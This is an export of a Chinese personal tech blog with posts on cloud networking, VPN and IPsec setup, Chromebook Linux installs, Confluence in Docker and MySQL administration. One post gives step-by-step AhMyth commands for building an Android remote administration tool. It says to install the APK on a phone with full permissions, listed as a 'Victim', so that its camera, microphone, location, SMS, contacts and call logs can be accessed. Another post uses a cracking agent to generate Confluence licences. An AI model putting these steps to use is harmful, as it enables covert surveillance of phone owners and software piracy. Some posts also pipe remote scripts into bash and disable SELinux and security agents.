10.0.0.0&#x2F;24
10.0.1.0&#x2F;24
10.0.2.0&#x2F;24


分别建立一个公网子网，分配 IP 地址段：
10.0.3.0&#x2F;26
10.0.3.64&#x2F;26
10.0.3.128&#x2F;26



可以看出这个 VPC 还剩一段 IP：10.0.3.192&#x2F;26，这一段就留作冗余。
注意：

VPC 的 internet gateway 要放到公网子网里
VPC 的 SNAT 设备要放到公网子网里
VPC 的公网子网的 default gateway 指向的是 internet gateway
VPC 的私网子网的 default gateway 指向的是 SNAT 设备

待续本方案并没有考虑 IPv6 的情况，以后有机会更新的时候，会把 IPv6 的支持考虑进去。
]]></content>
      <tags>
        <tag>Best Practice</tag>
        <tag>VPC</tag>
        <tag>Subnet</tag>
        <tag>IP Allocation</tag>
        <tag>公有云</tag>
        <tag>最佳实践</tag>
      </tags>
  </entry>
  <entry>
    <title>手撸一个 Android 的 RAT(reote administration tool)</title>
    <url>/2020/03/Build%20RAT%20fon%20Android/index.html</url>
    <content><![CDATA[整一个 Android 的 RAT缘起这个需求来源没法说，就是想找个 Android 手机的远程管理工具。


具体步骤macOS 上npm install electron -g;brew tap AdoptOpenJDK/openjdk;brew cask install adoptopenjdk8;git clone https://github.com/AhMyth/AhMyth-Android-RAT.git;cd AhMyth-Android-RAT/AhMyth-Server;npm start;

在弹出的页面里 build 一个 apk，再安装到要远程管理的 android 手机上，并执行之。注意：权限要给够，要常驻内存。
然后再在 Victims 里 listen 一下，应该就会看到刚装了那个 apk 的手机报上来的信息。
点击进去后，发现能调用摄像头照相、录音、获取位置、存取手机存储里的资料、获取联系人信息、获取短信、发送短信、获取通话记录。
问题也很明显：安装时提示软件不是为 Android 10 编写的，也许会有兼容性问题，当然，Andorid 10 上也是能跑的。
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>AhMyth</tag>
        <tag>RAT</tag>
        <tag>apk</tag>
      </tags>
  </entry>
  <entry>
    <title>Building a wiki using confluence via docker</title>
    <url>/2021/05/Building%20a%20wiki%20using%20confluence%20via%20docker/index.html</url>
    <content><![CDATA[用 docker 跑 confluence 来搭建 wiki 系统Introduction略。
Steps in details执行命令：
# postgresql dbdocker run \	--name postgresdb \	-v /app/wiki_dbdata:/var/lib/postgresql \	-p 5432:5432 \	-e POSTGRES_PASSWORD=1111111 \	-d postgres:13.3# confluence# 我这里的部署方法是在 confluence 前面有 LB 的# 如果在没有 LB 的情况下，可以自己部署一台 nginx# 在 443 端口起一个虚机 wiki.abc.com# 反代请求到这台机器的 8090 端口（用 http）docker run -d \	--name confluence \	-p 8090:8090 \	-p 8091:8091 \	-v /app/confluence_data:/var/atlassian/application-data/confluence \	-e JVM_SUPPORT_RECOMMENDED_ARGS=-javaagent:/opt/atlassian/atlassian-agent.jar \	-e JVM_MAXIMUM_MEMORY=2048m \	-e ATL_PROXY_NAME=&#x27;wiki.abc.com’ \	-e ATL_PROXY_PORT=443 \	-e ATL_TOMCAT_SCHEME=https \	-e ATL_TOMCAT_SECURE=true \	--link postgresdb:db \	atlassian/confluence:7.9.3


结果出错，容器退出。这是正常的，因为容器里 “&#x2F;opt&#x2F;atlassian&#x2F;atlassian-agent.jar” 还不存在呀
# downloadwget \	https://gitee.com/pengzhile/atlassian-agent/attach_files/832832/download/atlassian-agent-v1.3.1.tar.gz# decompresstar xzvf atlassian-agent-v1.3.1.tar.gz# copy atlassian-agent.jar to container confluencedocker cp atlassian-agent.jar confluence:/opt/atlassian/atlassian-agent.jar# start container confluence againdocker start confluence

这回容器 confluence 能正常启动了
浏览器访问：https://wiki.abc.com，主要是记下有个机器号（假设是 AAAA-BBBB-CCCC-DDDD），这个 license 是根据那个有关系的。
docker exec -it confluence /bin/bash# calculate license for team calendarjava -jar /opt/atlassian/atlassian-agent.jar \	-p tc \	-m aaa@bbb.ccc \	-n abc \	-o https://10.0.0.1 \	-s AAAA-BBBB-CCCC-DDDD# calculate license for questionjava -jar /opt/atlassian/atlassian-agent.jar \	-p questions \	-m aaa@bbb.ccc \	-n abc \	-o https://10.0.0.1 \	-s AAAA-BBBB-CCCC-DDDD# calculate license for confluencejava -jar /opt/atlassian/atlassian-agent.jar \	-p conf \	-m aaa@bbb.ccc \	-n abc \	-o https://10.0.0.1 \	-s AAAA-BBBB-CCCC-DDDD

回到 https://wiki.abc.com 的安装页面，把上一步得到的几个 license 填进去，以后就是正常安装流程了。
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>wiki</tag>
        <tag>confluence</tag>
        <tag>crack</tag>
        <tag>atlanssian</tag>
        <tag>atlassian-agent.jar</tag>
      </tags>
  </entry>
  <entry>
    <title>Chromebook 安装 Debian 12 testing</title>
    <url>/2023/10/Chromebook%20%E5%AE%89%E8%A3%85%20Debian%2012%20testing/index.html</url>
    <content><![CDATA[缘起本来这台 HP Chromebook 11A G6 EE( 加了一张 128G 的 TF 卡 )，我安装好了 Arch Linux(Xfce)，都弄好了的，但最近在知乎上老被安利说装 Debian 的 testing 版，于是我又开始折腾，把 Debian 13 testing(trixie) 安装到这台 Chromebook 上。
安装时，使用 lvm 分区不成功，系统报错：

partman-lvm: pvcreate: error while loading shared libraries: libaio.so.1: cannot open shared object file: no such file or directory

现在想想可能还有其他办法，比如想办法把这个需要的包注入进去，但当时选择了先用 ext4 分区安装系统自带的 16G 的卡里，装完以后再想办法转成 lvm 并把 TF 卡的空间加进来。


具体步骤ext4 在自带存储上安装自带存储的设备号是：&#x2F;dev&#x2F;mmcblk1，容量只有 16G
这一步基本上没什么问题，我只讲一下最后自带存储的分区：

分区 1，vfat 格式，挂在 &#x2F;boot&#x2F;efi
分区 2，ext4 格式，挂在 &#x2F;

将 &#x2F; 迁移到 TF 卡（lvm）这一步应该是重中之重，难度、复杂度都在这里。
处理 TF 卡TF 卡的设备号是：&#x2F;dev&#x2F;mmcblk0，容量 128G
apt-get install lvm# 系统原来没装 lvmwipefs -fa /dev/mmcblk0# TF 卡上原来有数据，所以需要先 wipefs 干一下pvcreate /dev/mmcblk0# 也可以先对设备分区了再创建 pv，但也可以直接在裸设备上做vgcreate vg_root /dev/mmcblk0lvcreate -L 116G -n lv_root vg_root# TF 卡容量是 128G，可用为 116G 多一些，这里 lv 设 116G 大小，# 其实多大没关系（因为 lv 是随时可以扩的），但只要小于可用的就行mkfs.ext4 /dev/vg_root/lv_root

迁移数据到 &#x2F;dev&#x2F;vg_root&#x2F;lv_rootmkdir /mnt/new_root# 创建挂载点mount /dev/vg_root/lv_root /mnt/new_root# 把新的根区挂载上tar -cvpf - --one-file-system --acls --xattrs \    --selinux / | tar -C /mnt/new_root -xf -# 把数据倒到新的根区上cp -aux /dev /mnt/new_root# 把 /dev 下有更新的内容拷贝过来

接着还要修改新根区下 etc&#x2F;fstab 的内容，将挂载在 &#x2F; 的设备改成 &#x2F;dev&#x2F;vg_root&#x2F;lv_root
vi /mnt/new_root/etc/fstab# 这里之所以用 vi 而不是 vim 那是因为 vim 这个软件还尚未安装

mount --bind /dev /mnt/new_root/devchroot /mnt/new_rootmount -t proc /proc /procmount -t sysfs /sys /sysvgscanvgchange -aymkinitramfs -o /boot/initrd-`uname -r`.lvm.img `uname -r`# 上面这一步我感觉应该可以不做，因为上面 `apt-get install lvm`# 时我貌似有看到重新制作 initrd 的 image 的情况，看吧，# 这一句的目的是为了给 initrd 的 image 文件添加 lvm 的支持exit# 退出 chroot 状态cp /mnt/vg_root/lv_root/boot/initrd-`uname -r`.lvm.img /boot# 上面这一句我感觉其实也可以不做，因为老 / 区最终是要被干掉的呀

最后的收尾工作：

修改 &#x2F;mnt&#x2F;new_root&#x2F;boot&#x2F;grub&#x2F;grub.conf 的内容，最好新增一条 menuentry，内容拷贝原有的
把显示的名字改了
把 initrd 的 image 文件改成前面新做成的 initrd 的 image 文件
如果还有涉及到 root 的 uuid 什么的，也要将原来的设备的 uuid 改成新 root 的设备 &#x2F;dev&#x2F;vg_root&#x2F;lv_root 的 uuid（命令 blkid 里可以看到，注意：有的设备有 UUID 还有 PARTUUID，一般来讲原来用的是哪个替换的时候也要用哪个替换，如果没有对应的，那么就用 UUID 来替换）


修改文件 &#x2F;boot&#x2F;efi&#x2F;EFI&#x2F;debian&#x2F;grub.cfg，同样也是做 uuid 的替换

最后，重启系统迁移这一步应该就好了
shutdown -r now

将自带存储加入新 &#x2F; 区的 lv自带的存储的设备是：&#x2F;dev&#x2F;mmcblk1，老根区的设备号是：&#x2F;dev&#x2F;mmcblk1p2
电脑重新起来后，登录进去
wipefa -fa /dev/mmcblk1p2pvcreate /dev/mmcblk1p2# 创建 pv(physical volume)vgextend vg_root /dev/mmcblk1p2# 将老根分区所在存储加入到 vg_root 这个 vg（volume group） 里来lvextend -l +100%FREE /dev/vg_root/lv_root# 将 lv_root 这个 lv(logical volume) 的大小扩展到所有未用空间resize2fs /dev/vg_root/lv_root# 将 lv_root 这个 lv 上的 ext4 文件系统的大小扩展到整个 lv

如此，便完成了。
]]></content>
      <tags>
        <tag>Debian</tag>
        <tag>trixie</tag>
        <tag>Chromebook</tag>
        <tag>testing</tag>
        <tag>lvm</tag>
      </tags>
  </entry>
  <entry>
    <title>How to Install Xubuntu on a Chromebook</title>
    <url>/2022/11/How%20to%20Install%20Xubuntu%20on%20a%20Chromebook/index.html</url>
    <content><![CDATA[缘起鱼总毕业了，带回来一台 Chromebook(HP Chromebook 11A G6 EE)，说是毕业了，学校就把学生用的电脑送给学生了。
鱼总说这电脑配置挺渣的，但续航还行，ebay 上还能卖个二三十刀，让我看着办。
我还能怎么办？！凉拌呗。当下失业在家，没有收入，当然有垃圾必捡，且用且珍惜啦。
于是，折腾走起。鉴于国内使用 ChromeOS 的种种不便，决定还是装一套 Linux 跑着吧。本来，ChromeOS 就直接支持 Linux(打开开发者模式就会有个简单的 Linux 可用)，而且还能通过几种工具（如 Crouton 和 Crostini 或 chrx ）安装 Linux，但我觉得还是要装一个“干净”的 Linux 更好一些。


具体步骤turn on Developer Mode在 Chromebook 上打开开发者模式（Developer Mode），方法很简单。

关机
开机。同时按住 Esc key, refresh key（键盘最上一排，带箭头的大半个圆圈的那个键）和电源键
当显示 Chrome OS is missing or damaged 的图片时，同时按住 Ctrl+D
如果需要输入的话，直接回车
机器会重启进入 Chromebook 的初始化安装设置，完成设置后
当显示 OS verification is off 提示时按 Ctrl+D，系统会重启。搞定。

Create a Bootable USB Drive创建一个 Linux distribution 的安装 U 盘。

下载一个 Linux 的 iso 文件（image）
用 dd 命令或其他烧 iso 文件到 U 盘的工具（如 Balena Etcher ）将 ISO 文件写到 U 盘里。

disable firmware write-protect因为下一步刷写新的 firmware 需要关闭 write protection。所以这一步我们需要提前做。根据 Chromebook 的型号不一样，关闭 WP 的方法各异，具体请查阅：https://mrchromebox.tech/#devices，找到你的 Chromebook 的型号，看看其的 WP Method 是哪种情况，我的 HP Chromebook 11A G6 EE 是“battery”，意思是可以通过摘掉电池（battery）的方法来临时禁掉 firmware write-protect。
这里禁掉 WP 的方法很多，有的是拧下一颗螺钉……
于是我们先拆机，具体可以参考油管上的一个视频：HP Chromebook 11 G6 EE Battery Replacement@youtube，或者是拆机图：HP Chromebook 11 G6 EE Battery Replacement@ifixit，先把盖子拆了。
看到电池以后，把电池和主板连接的那个接头小心的拔出即可。
Install a UEFI BIOS刷一个 UEFI 的 BIOS 的 firmware，这里用的是 mrchromebox 改过的 coreboot

开机（因为电池被断开，所以要接着电源）
按 Ctrl+Alt+t，输入 shell，回车
接着输入命令：cd; curl -LO mrchromebox.tech/firmware-util.sh &amp;&amp; sudo bash firmware-util.sh
输入 2（也就是选“Install&#x2F;Update UEFI (Full ROM) Firmware”）
按提示输入（有机会插入 U 盘备份原来机器上的 ChromeOS 系统）直到刷写结束

上面的过程有几个需要注意的地方：

curl 命令的参数 “-LO” 是大写的英文字母”L”和“O”（不是数字 0 哟）
curl 命令出 ssl 握手错误的时候，多加一个参数“k”（也就是用参数“-LOk”而不是”-LO”）

Install Linux to Chromebook by USB stick这里终于要用到前面做的 USB 启动盘了。

插入前面做好的 Linux USB 启动盘
开机（保持电源接入）
敲击 esc 键进入 BIOS
选择 U 盘启动
然后就正常安装即可

]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>Linux</tag>
        <tag>Chromebook</tag>
        <tag>Xubuntu</tag>
        <tag>coreboot</tag>
        <tag>HP</tag>
        <tag>HP Chromebook 11A G6 EE</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样在 checkpoint 设备和 AWS 北京的 EC2 之间搭建 IPsec 隧道</title>
    <url>/2021/03/How%20to%20build%20IPsec%20tunnel%20between%20checkpoint%20and%20AWS%20ec2%20at%20cn-north-1/index.html</url>
    <content><![CDATA[缘起为了直接打通办公室内网和 AWS 内网，我搞了个“骨干网搭建”项目，其实就是打通办公室内网和 AWS 各个节点的内网。

AWS 海外节点之间好弄，有 Transit Gateway
AWS 北京到 AWS 海外直接也好弄，用 wireguard

难点在于办公室到 AWS 北京之间，因为我在办公室内网没有资源，于是只能求助集团的 IT 团队的网络组同事。结果歪打正着，人家打通到总部内网也是走的 IPsec 方案，于是直接可以依葫芦画瓢。


准备工作
disable source&#x2F;destination checking for EC2 using the console or aws-cli(prefer to https://docs.aws.amazon.com/vpc/latest/userguide/VPC_NAT_Instance.html#EIP_Disable_SrcDestCheck)

具体步骤on the side of checkpoint
Public IP: 3.3.3.3(supposed)
Local network: 10.0.1.0&#x2F;24

on the side of EC2
Elastic IP: 2.2.2.2(supposed)
Local network: 10.0.0.10&#x2F;24

# write configuration to file(take effect after next boot)cat &gt; /etc/sysconfig/network-scripts/ifcfg-lo:elastic &lt;&lt;EOFDEVICE=lo:elastic# use your elastic ip here, supposed 2.2.2.2 hereIPADDR=2.2.2.2NETMASK=255.255.255.255ONBOOT=yesNAME=elasticIPEOF# take effect immediatelyip a add 2.2.2.2/32 dev lo:elasticIP# software installationyum -y install libreswan# kernel tunecat &gt; /etc/sysctl.d/libreswan.conf &lt;&lt;EOFnet.ipv4.conf.default.accept_redirects = 0net.ipv4.conf.default.send_redirects = 0net.ipv4.ip_forward = 1net.ipv4.conf.all.rp_filter = 0net.ipv4.conf.default.rp_filter = 0net.ipv4.conf.eth0.rp_filter = 0net.ipv4.conf.ip_vti0.rp_filter = 0EOF# take kernel variables effectsysctl -p /etc/sysctl.d/libreswan.conf# PSK herecat &gt; /etc/ipsec.d/ofc.secrets &lt;&lt;EOF2.2.2.2 3.3.3.3 : PSK &quot;mypskstring&quot;EOFcat &gt; /etc/ipsec.d/ofc.conf &lt;&lt;EOFconfig setup    protostack=netkeyconn ofc    authby=secret    auto=start    # Amazon does not route ESP/AH packets, so these must be encapsulated in UDP    encapsulation=yes    # the following 4 lines must be matched with     # configuration at checkpoint in the office    ike=aes128-SHA1;modp1024    ikelifetime=24h    esp=aes128-SHA1    salifetime=24h    left=%defaultroute    # set our ID to your (static) elastic IP    leftid=2.2.2.2    leftsubnets=10.0.0.0/24,2.2.2.2/32    # remote endpoint IP    right=3.3.3.3    rightsubnet=10.0.1.0/24    dpdaction=restart    dpddelay=10    dpdtimeout=60EOFipsec startsystemctl enable ipsec

It’s OK now.
收尾工作
在 AWS VPC 中修改路由表，将到 10.0.1.0&#x2F;24 段也就是办公室段的路由指向这一台 EC2
在办公室的内网修改路由表，将 10.0.0.0&#x2F;24 段也就是 AWS 内网的路由指向 checkpoint（非必需，特别是当 checkpoint 本来就是缺省网关的情况下）

参考文献
https://libreswan.org/wiki/Interoperability

]]></content>
      <tags>
        <tag>tunnel</tag>
        <tag>Libreswan</tag>
        <tag>AWS</tag>
        <tag>EC2</tag>
        <tag>IPsec</tag>
        <tag>checkpoint</tag>
        <tag>Amazon Linux 2</tag>
        <tag>ISRG Root X1</tag>
      </tags>
  </entry>
  <entry>
    <title>How to build VPN server(IPsec) for iPhone</title>
    <url>/2021/01/How%20to%20build%20VPN%20server%20for%20iPhone/index.html</url>
    <content><![CDATA[Server sideenvironnement
OS: Amazon Linux 2
private IP: 10.0.0.1（bind at eth0）
public IP: 2.2.2.2（supposed, 2.2.2.2 is belong to France TELECOM）
network interface: eth0



step in detailShow you the code:
# install softwareyum -y install libreswan# version is 3.23 with yum install, I will upgrade it to 4.5rpm -ivh \	https://download.libreswan.org/binaries/rhel/7/x86_64/libreswan-4.5-1.el7.x86_64.rpm# get the public IP addressPUBLIC_IP=$(dig @resolver1.opendns.com -t A -4 myip.opendns.com +short)[ -z &quot;$PUBLIC_IP&quot; ] &amp;&amp; PUBLIC_IP=$(wget -t 3 -T 15 -qO- http://ipv4.icanhazip.com)printf &#x27;%s\n&#x27; &quot;$PUBLIC_IP&quot;# config file generatecat &gt; /etc/ipsec.d/ipsec.conf &lt;&lt;EOFconn setup    protostack=netkey    virtual-private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12,%v4:25.0.0.0/8,%v4:!10.231.247.0/24,%v4:!10.0.0.1/24    uniqueids=noconn xauth-psk    authby=secret    pfs=no    auto=add    rekey=no    left=%defaultroute    leftsubnet=0.0.0.0/0    rightaddresspool=10.231.247.1-10.231.247.254    right=%any    modecfgdns=1.1.1.1,8.8.8.8    leftxauthserver=yes    rightxauthclient=yes    leftmodecfgserver=yes    rightmodecfgclient=yes    modecfgpull=yes    xauthby=file    ikev2=neverEOF# main configuration file(/etc/ipsec.conf) modificationif ! grep -qs &#x27;^include /etc/ipsec\.d/\*\.conf$&#x27; /etc/ipsec.conf; then  echo &gt;&gt; /etc/ipsec.conf  echo &#x27;include /etc/ipsec.d/*.conf&#x27; &gt;&gt; /etc/ipsec.conffi# for xauth-pskcat &gt; /etc/ipsec.d/xauth.secrets &lt;&lt;EOF10.0.0.1 %any : PSK &quot;mypassword&quot;EOF# to be sure that file /etc/ipsec.d/passwd existtouch /etc/ipsec.d/passwd# account generationfor i in &#123;1..16&#125;do	password=$(openssl rand -base64 6)	pasw_enc=$(openssl passwd -1 &quot;$password&quot;)	cat &gt;&gt; /etc/ipsec.d/passwd &lt;&lt;EOFuser$&#123;i&#125;:$pasw_enc:xauth-pskEOF	echo &quot;user$&#123;i&#125;:$&#123;password&#125;&quot;done# start service ipsecipsec start# masquerate(configurate by iptables)iptables -t nat -A POSTROUTING \	-s 10.231.247.0/24 \	-o eth0 -m policy \	--dir out --pol none \	-j MASQUERADE

Client sideiOS
Settings→VPN→Add VPN Configuration…
fill the form below:
Type: IPsecDescription: anything you likeServer: 2.2.2.2Account: one of user[1..16]Password: see aboveSecret: mypassword


tap “DONE”

]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>iPhone</tag>
        <tag>科学上网</tag>
        <tag>IPsec</tag>
        <tag>VPN</tag>
        <tag>libreswan</tag>
        <tag>xauth</tag>
        <tag>psk</tag>
      </tags>
  </entry>
  <entry>
    <title>How to change MySQL server&#39;s data directory on Ubuntu</title>
    <url>/2020/02/How%20to%20change%20MySQL%20server&#39;s%20data%20directory/index.html</url>
    <content><![CDATA[How to change MySQL server’s data directory on Ubuntu背景MySQL server
MySQL server 的缺省 Data 目录是 &#x2F;var&#x2F;lib&#x2F;mysql
&#x2F;var&#x2F;lib&#x2F;mysql 目录一般在 &#x2F; 分区下
&#x2F; 区一般都不大，而且不推荐放数据
所以但凡正常 MySQL server，都存在 Data 目录放真正数据分区的需求
如果刚开始时没有设置好 Data 目录在数据分区，那么后来都有迁移 Data 目录到数据分区的需求



Ubuntu
AppArmor 是强制性访问控制（MAC）系统，是对内核（LSM）的增强，可以将程序限制在有限的资源集中。
AppArmor 在 Ubuntu 系统里基本上缺省启动生效。
Ubuntu 下的 MySQL server 缺省配置的有 AppArmor 设置。
所以要修改 MySQL Server’s Data 目录，需要先修改 MySQL server 的 AppArmor 设置

具体步骤修改 AppArmor 配置并使之生效cat &lt;&lt;EOF &gt; /etc/apparmor.d/local/usr.sbin.mysqld/opt/ r,/opt/** rwk,EOFsystemctl reload apparmor;

MySQL serversystemctl stop mysql;cd /var/lib;tar czf - mysql | (cd /opt/; tar xvf -)mv mysql mysql.20200528;ln -s /opt/mysql .chown -h mysql:mysql /var/lib/mysql;systemctl start mysql;# rm -rf mysql.20200528;	# exec it later
]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>MySQL</tag>
        <tag>AppArmor</tag>
        <tag>tar</tag>
        <tag>change</tag>
      </tags>
  </entry>
  <entry>
    <title>How to deal with a faked tf card</title>
    <url>/2022/12/How%20to%20deal%20with%20a%20faked%20tf%20card/index.html</url>
    <content><![CDATA[缘起上一任租户有个可能运营商送的监控，有个摄像头，反正没用了，我就拆下来看看，发现里面有个 TF 卡，标着 256G 容量。就是如下这货：



134G-&gt;268G插到电脑里，发现只能看到 134G 的容量，DiskUtil 里也是，如下图：

MacOS 下，执行：
sudo diskutil eraseDisk xxx xxxx xxxx xxxx

大致意思就是使用 MacOS 下的命令 diskutil 及相关参数 eraseDisk 来做。
注意：diskutil 的图形模式不具有这些功能！
这回，终于能认出来 268G 的容量了，如下图所示：

268G-&gt;30G于是，插上电脑（HP Chromebook 11a G6 EE，关于这台机器，可以看文章：[How to Install Xubuntu on a Chromebook](“&#x2F;2022&#x2F;11&#x2F;How to Install Xubuntu on a Chromebook&#x2F;“)）开始安装 Linux，结果发现老失败，说是 TF 卡那个分区失败。于是开始怀疑卡（标称容量）有问题，网上搜了些相关资料，然后在电脑上下载了个叫 f3 的程序，用其工具 f3probe 来测了一下，结果是：30G！测出来真实的容量只有 30G！
然后根据建议用 f3fix 命令修复了下，想把正确的容量大小写回去，结果发现……跟我想要的结果不一样。再次考虑到 f3 是一个八年前的项目了，我又找了台 windows 机器，装了一个 DiskGenius，想再确认一下容量。
30G-&gt;26G这一回，DiskGenius 只认出 26G 的容量！！！最后我赶紧分区、格式化，然后插回到监控摄像头里，这种容量造假的 TF 卡，我可不敢用来跑系统。说不定速度也是造假的呢。
]]></content>
      <tags>
        <tag>TF</tag>
        <tag>Micro SD</tag>
        <tag>faked</tag>
        <tag>f3</tag>
        <tag>f3probe</tag>
        <tag>f3fix</tag>
        <tag>DiskGenius</tag>
      </tags>
  </entry>
  <entry>
    <title>How to disable SELinux on CentOS 7.x in code</title>
    <url>/2019/07/How%20to%20disable%20SELinux%20on%20CentOS%207.x/index.html</url>
    <content><![CDATA[How to disable startup services from Aliyunsed -i.bak /etc/selinux/config -r -e &#x27;s/^SELINUX=.*/SELINUX=disabled/&#x27;setenforce 0
]]></content>
      <tags>
        <tag>SELinux</tag>
        <tag>Howto</tag>
        <tag>commandline</tag>
      </tags>
  </entry>
  <entry>
    <title>How to disable startup services from Aliyun</title>
    <url>/2019/08/How%20to%20disable%20startup%20services%20from%20Aliyun/index.html</url>
    <content><![CDATA[How to disable startup services from Aliyunfor i in aliyun aegisdo    systemctl stop $i    systemctl disable $idone
]]></content>
      <tags>
        <tag>Howto</tag>
        <tag>Aliyun Linux</tag>
        <tag>startup</tag>
      </tags>
  </entry>
  <entry>
    <title>How to dump all wiki pages from Phabricator</title>
    <url>/2019/12/How%20to%20dump%20all%20wiki%20pages%20in%20Phabricator/index.html</url>
    <content><![CDATA[How to dump all wiki pages from Phabricator参照的源代码在这里：https://gist.github.com/HackToHell/9f261728f4ceda1605c9b3b1f46addbc
install softwareyum -y install \	python-sqlalchemy \	python-pandas \	MySQL-python;



code# -*- coding: utf-8 -*-import pandas as pdimport osimport errnofrom sqlalchemy import *import sysreload(sys)sys.setdefaultencoding(&#x27;utf8&#x27;)# Change me to the phriction databaseengine = create_engine(         &#x27;mysql://user:password@1.1.1.1/phabricator_phriction?charset=utf8mb4&#x27;)df=pd.read_sql(&#x27;select * from phriction_content&#x27;,engine)def get(x):    x=x.iloc[0]    strpath=&#x27;data/&#x27; + x[&#x27;slug&#x27;][:-1] + &#x27;.md&#x27;    #print strpath    strdir = os.path.dirname(strpath)    #print strdir    try:        os.makedirs(strdir)    except OSError as exc:        if exc.errno == errno.EEXIST and os.path.isdir(strdir):            pass        else:            raise    with open(strpath, &#x27;w&#x27;) as fp:        fp.write(x[&#x27;content&#x27;])for name,group in df.groupby(&#x27;title&#x27;):    if len(group) &gt; 1:        x=group[group[&#x27;version&#x27;] == group[&#x27;version&#x27;].max()] #Get only the latest version        get(x)    else:        get(group)


NOTE:  这里有个小 bug：如果当某个页面 A 被 move 成 B 之后呢，这个程序只能 dump 出 A.md，而且里面是空的。

]]></content>
      <tags>
        <tag>Phabricator</tag>
        <tag>wiki</tag>
        <tag>python</tag>
        <tag>exxport</tag>
      </tags>
  </entry>
  <entry>
    <title>How to host a project named &quot;Uses This&quot;</title>
    <url>/2019/06/How%20to%20host%20project%20usesthis/index.html</url>
    <content><![CDATA[缘起最近发现一个好玩儿的东东，一个澳大利亚的人写了个网站，专门做一些 IT 人事（也有其他行业的）的访问，问你都用什么（硬件软件）呀什么的。地址在：这里
后来发现居然还是开源的！！！
一下子忍不住手痒就给弄过来自己 host 了一个网站：我的 Uses This


下面讲讲怎样 host 这个网站的。说实话，ruby 的东西还没怎么弄过。
fetch datagit clone https://github.com/waferbaby/usesthis.git

prepare envdependent software install# CentOSyum install rubygem-tilt pandoc# Ubuntuapt-get install ruby-tilt pandoc

install rvm# Ubuntu 系列用gpg --keyserver \		hkp://pool.sks-keyservers.net \	--recv-keys \		409B6B1796C275462A1703113804BB82D39DC0E3 \		7D2BAF1CF37B13E2069D6956105BD0E739499BDB# CentOS 系列用gpg2 --keyserver \		hkp://pool.sks-keyservers.net \	--recv-keys \		409B6B1796C275462A1703113804BB82D39DC0E3 \		7D2BAF1CF37B13E2069D6956105BD0E739499BDBcurl -sSL https://get.rvm.io | bash -s stablesource /etc/profile.d/rvm.sh

install rubycd usesthisrvm install &quot;ruby-2.6.3&quot;

install dimples &amp; othersgem install dimples pandoc-ruby

config setup as you wantvim config.json

builddimples build

some problemtemplates&#x2F;feeds&#x2F;atom.erb 也许有些 bug
需要将其 21 行、22 行的内容：
&lt;%== &quot;&lt;p&gt;&lt;img src=\&quot;http://usesthis.theyan.gs/images/interviews/#&#123;interview.slug&#125;/portrait.jpg\&quot; width=\&quot;500\&quot; height=\&quot;325\&quot; alt=\&quot;#&#123;interview.title&#125;\&quot;&gt;&lt;/p&gt;&quot; %&gt;&lt;%== interview.rendered_contents %&gt;

改成：
&lt;%= &quot;&lt;p&gt;&lt;img src=\&quot;http://usesthis.theyan.gs/images/interviews/#&#123;interview.slug&#125;/portrait.jpg\&quot; width=\&quot;500\&quot; height=\&quot;325\&quot; alt=\&quot;#&#123;interview.title&#125;\&quot;&gt;&lt;/p&gt;&quot; %&gt;&lt;%= interview.rendered_contents %&gt;

build 才能成功
]]></content>
      <tags>
        <tag>ruby</tag>
        <tag>gem</tag>
        <tag>rvm</tag>
        <tag>dimples</tag>
      </tags>
  </entry>
  <entry>
    <title>How to install/upgrade fomula from local dmg file</title>
    <url>/2020/10/How-to-install-or-upgrade-fomula-from-local-dmg-file/index.html</url>
    <content><![CDATA[缘起brew 升级 Joplin 的时候，由于大陆从 github 下载软件包太慢，所以几乎每次都无法完整下载软件包而 timeout 退出。
于是就找了个 github 的代理手工下载（二进制）软件包，然后想通过 brew 直接用本地的 .dmg 文件来升级。
这里的难点，也是本文要谈的问题，就是如何让 brew 直接使用本地下载好的 .dmg 文件升级 Joplin（其他软件也一样）而不是从网上（github）下载。


具体方法执行命令：
brew upgrade Joplin

当开始下载 Joplin 的时候，Ctrl+C 终止掉。然后进入目录：
cd $(brew --cache)/downloads/# 找出最新的一个下载的文件，可以考虑用如下命令：ls -lt | grep -v total | head -n 1

这里会看到一个文件名，就我这里的具体情况来说是：

83b470164a0a78f6edefacb829dccc523bc774224c0aa9b2814fa16f719fb65e–Joplin-1.7.11.dmg.incomplete

然后把手工下载好的 Joplin 的 dmg 文件（我这里是 ～&#x2F;Downloads&#x2F;Joplin-1.7.11.dmg）拷贝过来，并重命名成需要的文件名。
cp ~/Downloads/Joplin-1.7.11.dmg \83b470164a0a78f6edefacb829dccc523bc774224c0aa9b2814fa16f719fb65e--Joplin-1.7.11.dmg# 注意：上面的目标文件名是上一步看到的文件名去掉 .incomplete

最后，就可以直接安装更新了。
brew upgrade Joplin
]]></content>
      <tags>
        <tag>tips</tag>
        <tag>upgrade</tag>
        <tag>macOS</tag>
        <tag>brew</tag>
        <tag>Homebrew</tag>
        <tag>dmg</tag>
        <tag>Joplin</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 下 wireguard 出问题的解决</title>
    <url>/2019/03/Linux%20%E4%B8%8B%20wireguard%20%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/index.html</url>
    <content><![CDATA[缘起办公室某台跑 wireguard 打洞的机器挂了，重启之后发现 wireguard 设备起不来，
wg-quick up wg_ofc;# 配置文件为：/etc/wireguard/wg_ofc.conf

会报错：

Cannot find device “wg_ofc”



排查问题参照另外的文章：用 wireguard 在两个网络之间打洞 能了解以前的“洞”是怎么打的。
lsmod | grep wireguard;

看果然没有 load wireguard 模块，
modprobe wireguard;

会提示这个模块（wireguard）找不到，大致了解什么问题了，应该是某一次升级过 linux kernel，而没有安装相应的 source code 和 headers，从而导致 wireguard 模块没有被重新编译进新的内核模块目录，解决起来也算是相对简单。
